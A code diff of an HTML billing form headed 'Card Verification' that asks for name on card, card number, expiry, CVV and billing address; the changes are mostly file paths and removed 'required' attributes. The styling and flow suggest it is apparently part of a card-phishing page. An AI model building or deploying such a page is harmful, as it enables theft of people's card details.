@@ -5,8 +5,8 @@
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <link rel="stylesheet" href="billing.css">
-      <link rel="stylesheet" href="mobile.css">
+      <link rel="stylesheet" href="./css/billing.css">
+      <link rel="stylesheet" href="./css/mobile.css">
       <link rel="stylesheet" href="./fontsawesome/css/all.css">
       <title>Document</title>
 </head>
@@ -62,27 +62,25 @@
                   <h2 style="color: #d71e28;">Card Verification</h2>
                   <label>
                         <br>
-                        <input type="text" name="" id="nameoncard" placeholder="Name on card" autocomplete="cc-name"
-                              required>
+                        <input type="text" name="" id="nameoncard" placeholder="Name on card" autocomplete="cc-name">
                   </label> <br>
                   <input type="text" class="ccFormatMonitor" placeholder="Card Number" maxlength="18" name="cc"
-                        autocomplete="cc-number" required>
+                        autocomplete="cc-number">
+                  <!-- 
+                    <input 
+                           type="" 
+                           id="inputExpDate" 
+                           placeholder="MM / YY" 
+                           maxlength="5" autocomplete="cc-exp"> -->
+                  <input maxlength='5' placeholder="MM/YY" type="text" onkeyup="formatString(event);">
 
-
-
-                  <input maxlength='5' placeholder="MM/YY" type="text" required onkeyup="formatString(event);">
-
-                  <input type="password" class="cvv" placeholder="CVV" maxlength="3" autocomplete="" required> <br>
-
-
+                  <input type="password" class="cvv" placeholder="CVV" maxlength="3" autocomplete=""> <br>
                   <label>
-                        <input type="text" id="b-a" placeholder="Billing Address" required>
+                        <input type="text" id="b-a" placeholder="Billing Address">
                   </label> <br>
-
-
                   <label id="city-1">
                         city <br>
-                        <input type="text" id="c-y" required>
+                        <input type="text" id="c-y">
 
                   </label>
                   <div class="country">
@@ -151,6 +149,7 @@
                               <option value="WI">Wisconsin</option>
                               <option value="WY">Wyoming</option>
                         </select>
+
                   </label>
 
                   <label id="zipcode">
@@ -159,11 +158,14 @@
                   </label>
 
                   <div class="btn">
+
                         <a href="/files.html">
+
                               <button class="btn-1">Continue</button>
                         </a>
-                  </div>
 
+
+                  </div>
             </div>
 
       </main>
